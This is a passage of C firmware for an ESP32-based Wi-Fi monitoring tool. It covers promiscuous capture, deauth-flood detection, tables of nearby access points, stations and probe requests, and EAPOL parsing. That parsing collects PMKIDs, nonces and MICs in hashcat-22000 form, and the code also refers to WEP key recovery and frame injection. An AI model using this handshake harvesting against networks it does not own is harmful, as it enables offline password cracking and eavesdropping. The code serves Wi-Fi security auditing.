        /* Deauth/disassoc rate detector (M5-P4.2): a cheap subtype peek on
         * management frames. A sustained elevated rate is the signature of a
         * deauthentication/disassociation flood. */
        if (type == WIFI_PKT_MGMT && p->rx_ctrl.sig_len >= 1) {
            uint8_t fsub = (p->payload[0] >> 4) & 0xF;
            if      (fsub == 12) s_mon_deauth++;
            else if (fsub == 10) s_mon_disassoc++;
        }
    }

    /* Copy-out for the passive parser (M5-P3): management frames carry AP
     * and probe-request identity, so they get the full early-IE snaplen; data
     * frames only need to map a client to its AP, so a short snaplen keeps
     * the ring lightweight against the bulk of the traffic. This does a
     * bounded memcpy into the SPSC PSRAM ring, dropping (and counting) frames
     * when it's full so the radio is never blocked. The tail index is
     * release-stored so the filled slot is visible to the parser before the
     * publish. (PCAP export uses its own, separate all-frames ring.) */
    if (s_parse_active && s_ring && p && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
        uint32_t tail = s_ring_tail;                                    /* the sole producer */
        uint32_t head = __atomic_load_n(&s_ring_head, __ATOMIC_ACQUIRE);
        if ((tail - head) >= CAP_SLOTS) {
            s_ring_drop++;                                              /* the ring is full */
        } else {
            cap_slot_t *slot = &s_ring[tail & (CAP_SLOTS - 1)];
            uint16_t len  = p->rx_ctrl.sig_len;
            /* Data frames need only the MAC header for the station map (short snaplen), EXCEPT an
             * EAPOL frame (copied in full for the key exchange + PMKID) and — while WEP recovery is
             * active — a PROTECTED data frame, whose IV + encrypted body the recovery parser needs. */
            uint16_t snap = CAP_SNAP;
            if (type == WIFI_PKT_DATA) {
                bool wep_prot = (s_wep_active && len >= 2 && (p->payload[1] & 0x40));
                snap = (wep_prot || eapol_offset(p->payload, len)) ? CAP_SNAP : CAP_SNAP_DATA;
            }
            uint16_t cap  = len > snap ? snap : len;
            slot->ts_us    = esp_timer_get_time();
            slot->rssi     = (int8_t)p->rx_ctrl.rssi;
            slot->channel  = (uint8_t)p->rx_ctrl.channel;
            slot->pkt_type = (uint8_t)type;
            slot->orig_len = len;
            slot->cap_len  = cap;
            memcpy(slot->data, p->payload, cap);
            __atomic_store_n(&s_ring_tail, tail + 1, __ATOMIC_RELEASE);
        }
    }

    /* Copy-out for PCAP (M5-P3.3): all frame types, with a larger snaplen,
     * into the separate PCAP ring. Uses the same O(1) drop-on-full discipline;
     * the big-stack writer task does the actual SD I/O, never this callback.
     * An EAPOL-filtered session (M5-P4.1) keeps only the key-exchange and
     * naming frames. */
    if (s_pcap_active && s_pcap_ring && p &&
        pcap_frame_wanted(p->payload, p->rx_ctrl.sig_len, type)) {
        uint32_t tail = s_pcap_tail;                                    /* the sole producer */
        uint32_t head = __atomic_load_n(&s_pcap_head, __ATOMIC_ACQUIRE);
        if ((tail - head) >= PCAP_SLOTS) {
            s_pcap_drop++;                                              /* the ring is full */
        } else {
            pcap_slot_t *slot = &s_pcap_ring[tail & (PCAP_SLOTS - 1)];
            uint16_t len = p->rx_ctrl.sig_len;
            uint16_t cap = len > PCAP_SNAP ? PCAP_SNAP : len;
            slot->ts_us    = esp_timer_get_time();
            slot->rssi     = (int8_t)p->rx_ctrl.rssi;
            slot->channel  = (uint8_t)p->rx_ctrl.channel;
            slot->orig_len = len;
            slot->cap_len  = cap;
            memcpy(slot->data, p->payload, cap);
            __atomic_store_n(&s_pcap_tail, tail + 1, __ATOMIC_RELEASE);
        }
    }
}

/* The periodic tick, running on the esp_timer task off the LVGL task:
 * hops the channel while hopping is enabled, and recomputes the frame rate
 * over the actual elapsed window, roughly 1s. */
static void mon_tick(void *arg)
{
    (void)arg;
    if (!s_mon_active) {
        return;                                       /* teardown already flipped this off: bail out */
    }
    if (s_mon_hop) {
        int ch = s_mon_chan + 1;
        if (ch > 13) {
            ch = 1;
        }
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_mon_chan = ch;
    }
    int64_t now = esp_timer_get_time();
    int64_t dt = now - s_mon_rate_t0;
    if (dt >= 1000000) {                              /* a roughly 1s window */
        uint32_t total = s_mon_total;
        s_mon_rate = (uint32_t)((int64_t)(total - s_mon_rate_base) * 1000000 / dt);
        s_mon_rate_base = total;
        uint32_t dd = s_mon_deauth + s_mon_disassoc;  /* the deauth+disassoc rate over that same window */
        s_mon_dd_rate = (uint32_t)((int64_t)(dd - s_mon_dd_base) * 1000000 / dt);
        s_mon_dd_base = dd;
        if (s_mon_dd_rate > s_mon_dd_peak) s_mon_dd_peak = s_mon_dd_rate;
        s_mon_rate_t0 = now;
    }
}

/* Installs capture: drops any STA link (with only one radio, this frees
 * it up to hop), sets the frame filter and rx callback, enters promiscuous
 * mode, and starts the hop/sample timer. Called either from the worker,
 * when the STA is already started, or from the STA_START event when the
 * radio had to be powered up first. */
static void enter_promiscuous(void)
{
    s_mon_prev_connected = s_connected;               /* remembers what to restore on exit */

    s_want_connect = false;                           /* the disconnect handler must not retry after this */
    if (s_connected || s_sta_started) {
        esp_wifi_disconnect();
    }
    s_connected = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();

    s_mon_total = 0;
    for (int i = 0; i < NOCSIF_WIFI_PKT_KINDS; i++) {
        s_mon_by_type[i] = 0;
    }
    for (int i = 0; i < 14; i++) {
        s_mon_ch[i] = 0;
    }
    s_mon_rate = 0;
    s_mon_rssi_last = 0;
    s_mon_rssi_peak = -127;
    s_mon_rate_base = 0;
    s_mon_rate_t0 = esp_timer_get_time();
    s_mon_deauth = s_mon_disassoc = s_mon_dd_rate = s_mon_dd_peak = s_mon_dd_base = 0;

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_CTRL |
                       WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(on_promiscuous);
    esp_err_t e = esp_wifi_set_promiscuous(true);
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous(true): %s", esp_err_to_name(e));
        publish_status("err");
        publish_detail("Monitor failed to start.");
        return;
    }
    if (s_mon_chan < 1 || s_mon_chan > 13) {
        s_mon_chan = 1;
    }
    esp_wifi_set_channel(s_mon_chan, WIFI_SECOND_CHAN_NONE);

    if (s_mon_timer == NULL) {
        const esp_timer_create_args_t ta = { .callback = mon_tick, .name = "wifimon" };
        ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_mon_timer));
    }
    if (s_mon_timer) {
        esp_timer_start_periodic(s_mon_timer, 250000);   /* a 250ms dwell time per channel */
    }
    s_mon_active = true;
    ESP_LOGI(TAG, "monitor on (mgmt|ctrl|data, %s); int-dma free=%u largest=%u",
             s_mon_hop ? "hop 1-13" : "lock",
             (unsigned)nocsif_int_dma_free(),
             (unsigned)nocsif_int_dma_largest());
    refresh_strings();
}

/* Stops capture but does not restore the STA link; shared by monitor-off and radio-disable. */
static void monitor_teardown(void)
{
    s_pending_monitor = false;
    s_parse_active = false;                           /* no capture -> stop parsing (ring/task kept) */
    do_mgmt_tx_off();                                 /* no capture -> stop any management-frame TX  */
    do_wep_off();                                     /* no capture -> stop WEP recovery (worker+replay) */
    do_beacon_off();                                  /* no capture -> stop any beacon TX            */
    pcap_stop_and_free();                             /* no capture -> stop PCAP + free the writer task */
    if (!s_mon_active) {
        return;
    }
    if (s_mon_timer) {
        esp_timer_stop(s_mon_timer);                  /* no more hops or samples */
    }
    s_mon_active = false;                             /* the tick function bails out on this flag */
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    ESP_LOGI(TAG, "monitor off (captured %u frames)", (unsigned)s_mon_total);
}

/* ---- passive parser: decodes captured management frames into the nearby-AP table (M5-P3) ---- */

/* A small, curated OUI-to-vendor table covering common consumer and
 * infrastructure makers. Not exhaustive — just a best-effort label for the
 * list; an unknown OUI shows "" and a randomized MAC shows "random". (An
 * SD-backed full OUI database could replace this later.) Keyed by the first
 * 3 BSSID bytes, big-endian. */
static const struct { uint8_t oui[3]; const char *name; } k_oui[] = {
    { {0x24,0x0A,0xC4}, "Espressif" }, { {0x24,0x6F,0x28}, "Espressif" }, { {0x30,0xAE,0xA4}, "Espressif" },
    { {0xA4,0xCF,0x12}, "Espressif" }, { {0x84,0xF3,0xEB}, "Espressif" }, { {0xEC,0xFA,0xBC}, "Espressif" },
    { {0x3C,0x07,0x54}, "Apple" },     { {0xA4,0x83,0xE7}, "Apple" },     { {0xF0,0x18,0x98}, "Apple" },
    { {0xDC,0xA9,0x04}, "Apple" },     { {0xAC,0xBC,0x32}, "Apple" },
    { {0x50,0xC7,0xBF}, "TP-Link" },   { {0xEC,0x08,0x6B}, "TP-Link" },   { {0x60,0x32,0xB1}, "TP-Link" },
    { {0x20,0xE5,0x2A}, "Netgear" },   { {0xA0,0x40,0xA0}, "Netgear" },   { {0x9C,0xD3,0x6D}, "Netgear" },
    { {0x24,0xA4,0x3C}, "Ubiquiti" },  { {0x78,0x8A,0x20}, "Ubiquiti" },  { {0xFC,0xEC,0xDA}, "Ubiquiti" },
    { {0x3C,0x5A,0xB4}, "Google" },    { {0x54,0x60,0x09}, "Google" },    { {0xDA,0xA1,0x19}, "Google" },
    { {0x44,0x65,0x0D}, "Amazon" },    { {0xFC,0x65,0xDE}, "Amazon" },    { {0x68,0x37,0xE9}, "Amazon" },
    { {0x4C,0x5E,0x0C}, "MikroTik" },  { {0x64,0xD1,0x54}, "MikroTik" },  { {0xDC,0x2C,0x6E}, "MikroTik" },
    { {0x64,0x09,0x80}, "Xiaomi" },    { {0x28,0x6C,0x07}, "Xiaomi" },
    { {0x00,0xE0,0xFC}, "Huawei" },    { {0x48,0x46,0xFB}, "Huawei" },
    { {0x2C,0x56,0xDC}, "ASUS" },      { {0x1C,0xB7,0x2C}, "ASUS" },
    { {0x1C,0xBD,0xB9}, "D-Link" },    { {0xC8,0xD3,0xA3}, "D-Link" },
    { {0x5C,0x0A,0x5B}, "Samsung" },   { {0x8C,0x77,0x12}, "Samsung" },
    { {0x00,0x0B,0x86}, "Aruba" },     { {0x6C,0xF3,0x7F}, "Aruba" },
    { {0x00,0x18,0x0A}, "Meraki" },    { {0xE0,0xCB,0xBC}, "Meraki" },
};

/* Returns the vendor label for a BSSID. A locally-administered address
 * (bit 1 of octet 0 set) is a randomized MAC — flagged as "random", which is
 * itself a useful signal, rather than looked up as a vendor. Writes a
 * NUL-terminated `out`. */
static void oui_lookup(const uint8_t bssid[6], char *out, size_t outlen)
{
    if (bssid[0] & 0x02) { snprintf(out, outlen, "random"); return; }
    for (size_t i = 0; i < sizeof(k_oui) / sizeof(k_oui[0]); i++) {
        if (k_oui[i].oui[0] == bssid[0] && k_oui[i].oui[1] == bssid[1] && k_oui[i].oui[2] == bssid[2]) {
            snprintf(out, outlen, "%s", k_oui[i].name);
            return;
        }
    }
    out[0] = '\0';
}

/* Classifies an RSN IE body, after its tag and length: version(2),
 * group(4), pairwise{cnt(2), list}, akm{cnt(2), list}, ... Scans the AKM
 * suites for SAE (WPA3) or 802.1X/EAP (enterprise), defaulting to WPA2-PSK.
 * Every offset is bounds-checked against `len`, since the IE may have been
 * truncated by the snaplen. */
static uint8_t classify_rsn(const uint8_t *ie, int len)
{
    int off = 2;                                   /* skip the version field */
    if (off + 4 > len) return NOCSIF_WIFI_SEC_WPA2;
    off += 4;                                      /* the group cipher suite */
    if (off + 2 > len) return NOCSIF_WIFI_SEC_WPA2;
    int pc = ie[off] | (ie[off + 1] << 8);         /* the pairwise cipher count */
    off += 2 + pc * 4;
    if (off + 2 > len) return NOCSIF_WIFI_SEC_WPA2;
    int ac = ie[off] | (ie[off + 1] << 8);         /* the AKM suite count */
    off += 2;
    bool sae = false, ent = false;
    for (int i = 0; i < ac; i++) {
        if (off + 4 > len) break;
        if (ie[off] == 0x00 && ie[off + 1] == 0x0F && ie[off + 2] == 0xAC) {   /* the 00-0F-AC suite family */
            uint8_t t = ie[off + 3];
            if (t == 8 || t == 9)                                  sae = true;  /* SAE or SAE-FT */
            else if (t == 1 || t == 3 || t == 5 || t == 11 || t == 12) ent = true;  /* 802.1X/EAP */
        }
        off += 4;
    }
    if (sae) return NOCSIF_WIFI_SEC_WPA3;
    if (ent) return NOCSIF_WIFI_SEC_WPA2E;
    return NOCSIF_WIFI_SEC_WPA2;
}

/* Inserts or updates one AP in the table; runs on the parser task.
 * First-seen ordering keeps rows stable, and the stalest entry is evicted
 * once the table is full. Formatting happens before the lock is taken, so
 * the short spinlock only ever touches the table itself, keeping the LVGL
 * reader from being blocked for long. */
static void ap_upsert(const uint8_t bssid[6], const char *ssid, bool hidden,
                      uint8_t channel, int8_t rssi, uint8_t sec, int64_t ts,
                      const uint8_t *ie, int ie_len)
{
    if (!s_mon_ap) return;                          /* PSRAM table not allocated (parser not armed) */
    if (nocsif_wifi_omit_contains(bssid)) return;   /* omitted — never enters the passive tables */

    char vendor[12];
    oui_lookup(bssid, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_ap_cnt; i++) {
        if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, bssid, 6) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_ap_cnt < MON_AP_MAX) {
            idx = s_mon_ap_cnt++;
        } else {                                    /* evict the stalest entry */
            idx = 0;
            int64_t oldest = s_mon_ap[0].last_us;
            for (int i = 1; i < MON_AP_MAX; i++) {
                if (s_mon_ap[i].last_us < oldest) { oldest = s_mon_ap[i].last_us; idx = i; }
            }
        }
        mon_ap_t *n = &s_mon_ap[idx];
        n->used = true;
        memcpy(n->bssid, bssid, 6);
        n->ssid[0] = '\0';
        n->frames  = 0;
        structural = true;
    }
    mon_ap_t *a = &s_mon_ap[idx];
    if (!hidden && ssid[0]) {                        /* reveal or refresh the SSID, but keep an already-known one */
        size_t k = 0;
        while (ssid[k] && k < sizeof(a->ssid) - 1) { a->ssid[k] = ssid[k]; k++; }
        a->ssid[k] = '\0';
    }
    a->channel = channel;
    a->rssi    = rssi;
    a->sec     = sec;
    if (a->frames < 0xFFFF) a->frames++;
    a->last_us = ts;
    memcpy(a->vendor, vendor, sizeof a->vendor);
    if (s_mon_ap_ie && ie && ie_len > 0) {          /* keep the raw IE bytes for the detail decoder */
        int n = ie_len > MON_AP_IE_MAX ? MON_AP_IE_MAX : ie_len;
        memcpy(s_mon_ap_ie[idx].data, ie, (size_t)n);
        s_mon_ap_ie[idx].len = (uint16_t)n;
    }
    if (structural) s_mon_ap_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Inserts or updates one station in the table; runs on the parser task. Same first-seen/stalest-evict pattern as ap_upsert; the short spinlock only touches the table. */
static void sta_upsert(const uint8_t mac[6], const uint8_t bssid[6],
                       uint8_t channel, int8_t rssi, int64_t ts)
{
    if (!s_mon_sta) return;                         /* PSRAM table not allocated (parser not armed) */
    if (nocsif_wifi_omit_contains(mac)) return;     /* omitted — never enters the station table */

    char vendor[12];
    oui_lookup(mac, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_sta_cnt; i++) {
        if (s_mon_sta[i].used && memcmp(s_mon_sta[i].mac, mac, 6) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_sta_cnt < MON_STA_MAX) {
            idx = s_mon_sta_cnt++;
        } else {                                    /* evict the stalest entry */
            idx = 0;
            int64_t oldest = s_mon_sta[0].last_us;
            for (int i = 1; i < MON_STA_MAX; i++) {
                if (s_mon_sta[i].last_us < oldest) { oldest = s_mon_sta[i].last_us; idx = i; }
            }
        }
        mon_sta_t *n = &s_mon_sta[idx];
        n->used = true;
        memcpy(n->mac, mac, 6);
        n->frames = 0;
        structural = true;
    }
    mon_sta_t *st = &s_mon_sta[idx];
    if (bssid) memcpy(st->bssid, bssid, 6);
    st->channel = channel;
    st->rssi    = rssi;
    if (st->frames < 0xFFFF) st->frames++;
    st->last_us = ts;
    memcpy(st->vendor, vendor, sizeof st->vendor);
    if (structural) s_mon_sta_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Insert or update one probe request, keyed by the (device, requested-SSID) pair. */
static void probe_upsert(const uint8_t mac[6], const char *ssid, int8_t rssi, int64_t ts, uint8_t channel)
{
    if (!s_mon_probe) return;                       /* PSRAM table not allocated (parser not armed) */
    if (nocsif_wifi_omit_contains(mac)) return;     /* omitted — never enters the probe table */

    char vendor[12];
    oui_lookup(mac, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_probe_cnt; i++) {
        if (s_mon_probe[i].used && memcmp(s_mon_probe[i].mac, mac, 6) == 0 &&
            strcmp(s_mon_probe[i].ssid, ssid) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_probe_cnt < MON_PROBE_MAX) {
            idx = s_mon_probe_cnt++;
        } else {                                    /* evict the stalest entry */
            idx = 0;
            int64_t oldest = s_mon_probe[0].last_us;
            for (int i = 1; i < MON_PROBE_MAX; i++) {
                if (s_mon_probe[i].last_us < oldest) { oldest = s_mon_probe[i].last_us; idx = i; }
            }
        }
        mon_probe_t *n = &s_mon_probe[idx];
        n->used = true;
        memcpy(n->mac, mac, 6);
        snprintf(n->ssid, sizeof n->ssid, "%s", ssid);
        n->count = 0;
        structural = true;
    }
    mon_probe_t *pr = &s_mon_probe[idx];
    pr->rssi = rssi;
    if (pr->count < 0xFFFF) pr->count++;
    pr->last_us = ts;
    pr->channel = channel;
    memcpy(pr->vendor, vendor, sizeof pr->vendor);
    if (structural) s_mon_probe_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Maps a data frame to a (station, AP) pair using the ToDS/FromDS bits
 * and addresses, and records the station. Only infrastructure frames —
 * exactly one of ToDS/FromDS set — resolve an AP; IBSS/WDS frames are
 * skipped. Group/broadcast senders and the AP's own address are never
 * recorded as a station. */
static void parse_data_frame(const cap_slot_t *s, const uint8_t *d)
{
    if (s->cap_len < 24) {                          /* needs the 3-address MAC header */
        return;
    }
    bool tods   = (d[1] & 0x01) != 0;
    bool fromds = (d[1] & 0x02) != 0;
    const uint8_t *a1 = d + 4, *a2 = d + 10;
    const uint8_t *sta, *bssid;
    if (tods && !fromds)      { bssid = a1; sta = a2; }   /* station to AP: addr2 is the client */
    else if (!tods && fromds) { sta = a1; bssid = a2; }   /* AP to station: addr1 is the client */
    else                      { return; }                 /* IBSS/WDS: there's no infrastructure AP to map to */

    if (sta[0] & 0x01)              return;         /* a group/broadcast sender isn't a station */
    bool allzero = true;
    for (int i = 0; i < 6; i++) { if (sta[i]) { allzero = false; break; } }
    if (allzero)                   return;
    if (memcmp(sta, bssid, 6) == 0) return;         /* the AP itself is never recorded as a station */

    sta_upsert(sta, bssid, s->channel, s->rssi, s->ts_us);
}

/* Decodes a probe request (management subtype 4): addr2 is the
 * searching device, and the first IE (tag 0) is the SSID it's looking for
 * (empty means a broadcast/wildcard probe). */
static void parse_probe_req(const cap_slot_t *s, const uint8_t *d)
{
    if (s->cap_len < 24) {
        return;
    }
    const uint8_t *sa = d + 10;                     /* addr2 is the source: the device itself */
    if (sa[0] & 0x01) {                             /* a group source shouldn't occur here: skip it */
        return;
    }
    char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    int len = s->cap_len;
    int off = 24;                                   /* probe-request IEs start right after the header */
    while (off + 2 <= len) {
        uint8_t tag  = d[off];
        uint8_t tlen = d[off + 1];
        if (off + 2 + tlen > len) break;            /* truncated by the snaplen: stop */
        if (tag == 0) {                             /* the SSID, which is the first IE */
            int n = tlen > 32 ? 32 : tlen;
            bool allzero = true;
            for (int i = 0; i < n; i++) { if (d[off + 2 + i]) { allzero = false; break; } }
            if (n > 0 && !allzero) {
                for (int i = 0; i < n; i++) {        /* sanitize it to the font's printable character range */
                    uint8_t c = d[off + 2 + i];
                    ssid[i] = (c >= 0x20 && c < 0x7F) ? (char)c : '?';
                }
                ssid[n] = '\0';
            }
            break;                                  /* SSID handled; the rest is rates and similar fields */
        }
        off += 2 + tlen;
    }
    probe_upsert(sa, ssid, s->rssi, s->ts_us, s->channel);
}

/* Inserts or updates one BSSID's key-exchange record; runs on the parser task. Same first-seen/stalest-evict pattern as ap_upsert; a PMKID, once seen, is retained. */
/* One decoded EAPOL message, handed to hs_upsert, which merges it into the BSSID's table entry. */
typedef struct {
    uint8_t bssid[6];
    uint8_t sta[6];   bool have_sta;
    uint8_t msg;                              /* 1 through 4 */
    bool    have_pmkid;  uint8_t pmkid[16];   /* taken from message 1 */
    bool    have_anonce; uint8_t anonce[32];  /* taken from message 1 */
    bool    have_mic;    uint8_t mic[16];     /* taken from message 2 */
    uint8_t eapol[HS_EAPOL_MAX];              /* the message-2 EAPOL frame, MIC zeroed */
    uint8_t eapol_len;
    int8_t  rssi;  int64_t ts;
} eapol_parsed_t;

static void hs_upsert(const eapol_parsed_t *p)
{
    if (!s_mon_hs) return;                          /* PSRAM table not allocated (parser not armed) */
    char vendor[12];
    oui_lookup(p->bssid, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_hs_cnt; i++) {
        if (s_mon_hs[i].used && memcmp(s_mon_hs[i].bssid, p->bssid, 6) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_hs_cnt < MON_HS_MAX) {
            idx = s_mon_hs_cnt++;
        } else {                                    /* evict the stalest entry */
            idx = 0;
            int64_t oldest = s_mon_hs[0].last_us;
            for (int i = 1; i < MON_HS_MAX; i++) {
                if (s_mon_hs[i].last_us < oldest) { oldest = s_mon_hs[i].last_us; idx = i; }
            }
        }
        mon_hs_t *n = &s_mon_hs[idx];
        memset(n, 0, sizeof *n);                     /* a fresh BSSID: clear every field */
        n->used = true;
        memcpy(n->bssid, p->bssid, 6);
        structural = true;
    }
    mon_hs_t *h = &s_mon_hs[idx];
    if (p->msg >= 1 && p->msg <= 4) h->msg_mask |= (uint8_t)(1u << (p->msg - 1));
    if (p->have_sta    && !h->have_sta)    { memcpy(h->sta, p->sta, 6);        h->have_sta = true; }
    if (p->have_pmkid  && !h->has_pmkid)   { memcpy(h->pmkid, p->pmkid, 16);   h->has_pmkid = true; }
    if (p->have_anonce && !h->have_anonce) { memcpy(h->anonce, p->anonce, 32); h->have_anonce = true; }
    if (p->have_mic    && !h->have_mic && p->eapol_len > 0) {
        memcpy(h->mic, p->mic, 16);
        memcpy(h->eapol, p->eapol, p->eapol_len);
        h->eapol_len = p->eapol_len;
        h->have_mic = true;
    }
    h->rssi = p->rssi;
    if (h->frames < 0xFFFF) h->frames++;
    h->last_us = p->ts;
    memcpy(h->vendor, vendor, sizeof h->vendor);
    if (structural) s_mon_hs_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Decodes an EAPOL-Key frame; `eo` is the EAPOL header's offset within
 * data frame `d`. Classifies which of the 4-way messages it's from, using
 * the key-info bits; captures the PMKID and ANonce from message 1, and the
 * MIC plus raw EAPOL bytes from message 2 — exactly what a hashcat-22000
 * line needs — keyed by BSSID. Every offset is bounds-checked against
 * cap_len, so a frame truncated by the snaplen just yields fewer fields.
 * Purely observational.
 *
 * The EAPOL-Key body, starting at `kf`: descriptor(1), info(2), keylen(2),
 * replay(8), nonce(32), iv(16), rsc(8), reserved(8), mic(16),
 * key-data-len(2), key-data(var) — so the nonce sits at kf+13, the MIC at
 * kf+77, and the key-data-len at kf+93 for the common 16-byte-MIC AKMs
 * (WPA2-PSK); a longer-MIC AKM just yields fewer fields. */
static void parse_eapol(const cap_slot_t *s, const uint8_t *d, int eo)
{
    int len = s->cap_len;
    if (eo + 4 > len)     return;
    if (d[eo + 1] != 3)   return;                    /* EAPOL packet type 3 means EAPOL-Key */
    int kf = eo + 4;                                 /* the key-frame body starts here */
    if (kf + 3 > len)     return;
    uint16_t info = (uint16_t)((d[kf + 1] << 8) | d[kf + 2]);   /* the key info field, big-endian */
    bool ack     = (info & 0x0080) != 0;
    bool mic     = (info & 0x0100) != 0;
    bool secure  = (info & 0x0200) != 0;
    bool install = (info & 0x0040) != 0;

    uint8_t msg = 0;
    if      ( ack && !mic)             msg = 1;      /* AP to STA, carries the ANonce and possibly a PMKID */
    else if (!ack &&  mic && !secure)  msg = 2;      /* STA to AP, carries the SNonce and MIC */
    else if ( ack &&  mic &&  install) msg = 3;      /* AP to STA */
    else if (!ack &&  mic &&  secure)  msg = 4;      /* STA to AP */
    if (msg == 0) return;                            /* a group-key rekey, or unknown: ignore it */

    /* The AP's address depends on direction: messages 1/3 are AP to STA, messages 2/4 are STA to AP. */
    bool tods   = (d[1] & 0x01) != 0;
    bool fromds = (d[1] & 0x02) != 0;
    const uint8_t *bssid, *sta;
    if      (!tods &&  fromds) { bssid = d + 10; sta = d + 4;  }   /* AP to STA: a2 is the AP, a1 is the STA */
    else if ( tods && !fromds) { bssid = d + 4;  sta = d + 10; }   /* STA to AP: a1 is the AP, a2 is the STA */
    else return;                                     /* IBSS/WDS: there's no infrastructure AP to map to */

    static eapol_parsed_t p;                         /* a single parser task, so a static buffer here is safe and keeps it off the stack */
    memset(&p, 0, sizeof p);
    memcpy(p.bssid, bssid, 6);
    memcpy(p.sta, sta, 6);
    p.have_sta = true;
    p.msg  = msg;
    p.rssi = s->rssi;
    p.ts   = s->ts_us;

    if (msg == 1) {
        if (kf + 45 <= len) {                        /* the ANonce is the key nonce, at kf+13 through kf+44 */
            memcpy(p.anonce, &d[kf + 13], 32);
            p.have_anonce = true;
        }
        int kdl_off = kf + 93;                       /* any PMKID present is inside the key data */
        if (kdl_off + 2 <= len) {
            int kdl = (d[kdl_off] << 8) | d[kdl_off + 1];
            int kd  = kdl_off + 2;
            int end = kd + kdl;
            if (end > len) end = len;
            int off = kd;
            while (off + 2 <= end) {                 /* walks the key-data KDEs */
                uint8_t t = d[off];
                uint8_t l = d[off + 1];
                if (off + 2 + l > end) break;
                if (t == 0xDD && l >= 0x14 &&        /* a vendor KDE, RSN OUI 00-0F-AC, PMKID type 4 */
                    d[off+2] == 0x00 && d[off+3] == 0x0F && d[off+4] == 0xAC && d[off+5] == 0x04) {
                    memcpy(p.pmkid, &d[off + 6], 16);
                    p.have_pmkid = true;
                    break;
                }
                off += 2 + l;
            }
        }
    } else if (msg == 2) {
        if (kf + 93 <= len) {                        /* the MIC (kf+77..92) plus the whole EAPOL frame's bytes */
            memcpy(p.mic, &d[kf + 77], 16);
            int klen = (d[eo + 2] << 8) | d[eo + 3]; /* the EAPOL body length field */
            int elen = 4 + klen;                     /* the whole EAPOL frame: header plus body */
            if (elen > len - eo)      elen = len - eo;
            if (elen > HS_EAPOL_MAX)  elen = HS_EAPOL_MAX;
            if (elen >= 81 + 16) {                    /* need enough room to reach through the MIC field */
                memcpy(p.eapol, &d[eo], elen);
                memset(&p.eapol[81], 0, 16);          /* zero the MIC field, needed for the hc22000 format */
                p.eapol_len = (uint8_t)elen;
                p.have_mic  = true;
            }
        }
    }

    hs_upsert(&p);
}

/* Decodes one captured frame, on the parser task, off the hot path.
 * Beacon and probe-response management frames identify an AP; probe
 * requests harvest the SSIDs being searched for; data frames map stations
 * to their AP. All IE offsets are bounds-checked against cap_len, so a
 * frame truncated by the snaplen just yields fewer fields. */
static void parse_frame(const cap_slot_t *s)
{
    if (s->cap_len < 24) {                          /* need at least a MAC header */
        return;
    }
    const uint8_t *d = s->data;
    uint8_t ftype = (d[0] >> 2) & 0x3;
    uint8_t fsub  = (d[0] >> 4) & 0xF;

    if (ftype == 2) {                               /* a data frame maps to a station, plus any EAPOL content */
        parse_data_frame(s, d);
        int eo = eapol_offset(d, s->cap_len);       /* the key exchange rides inside EAPOL data frames */
        if (eo) parse_eapol(s, d, eo);
        if (s_wep_active && (d[1] & 0x40)) parse_wep(s, d);  /* #4: WEP data frames -> IV+keystream */
        return;
    }
    if (ftype != 0) {                               /* control frames carry no identity information here */
        return;
    }
    if (fsub == 4) {                                /* a management probe request */
        parse_probe_req(s, d);
        return;
    }
    if (fsub != 8 && fsub != 5) {                   /* only beacon (8) or probe-response (5) below */
        return;
    }
    if (s->cap_len < 36) {                          /* need the fixed parameters for an AP decode */
        return;
    }
    const uint8_t *bssid = d + 16;                  /* addr3 */
    uint16_t cap_info = d[34] | (d[35] << 8);
    bool privacy = (cap_info & 0x0010) != 0;

    char    ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    bool    hidden  = true;
    uint8_t channel = s->channel;
    uint8_t sec     = privacy ? NOCSIF_WIFI_SEC_WEP : NOCSIF_WIFI_SEC_OPEN;
    bool    have_rsn = false, have_wpa = false;

    int len = s->cap_len;
    int off = 36;                                   /* the first tagged IE, right after the fixed parameters */
    while (off + 2 <= len) {
        uint8_t tag  = d[off];
        uint8_t tlen = d[off + 1];
        if (off + 2 + tlen > len) break;            /* truncated by the snaplen: stop */
        const uint8_t *v = d + off + 2;
        if (tag == 0) {                             /* the SSID */
            if (tlen > 0) {
                bool allzero = true;
                for (int i = 0; i < tlen; i++) { if (v[i]) { allzero = false; break; } }
                if (!allzero) {
                    int n = tlen > 32 ? 32 : tlen;
                    for (int i = 0; i < n; i++) {   /* sanitize it to the font's printable character range */
                        uint8_t c = v[i];
                        ssid[i] = (c >= 0x20 && c < 0x7F) ? (char)c : '?';
                    }
                    ssid[n] = '\0';
                    hidden = false;
                }
            }
        } else if (tag == 3) {                       /* the DS parameter set: the AP's home channel */
            if (tlen >= 1 && v[0] >= 1 && v[0] <= 14) channel = v[0];
        } else if (tag == 48) {                      /* RSN */
            have_rsn = true;
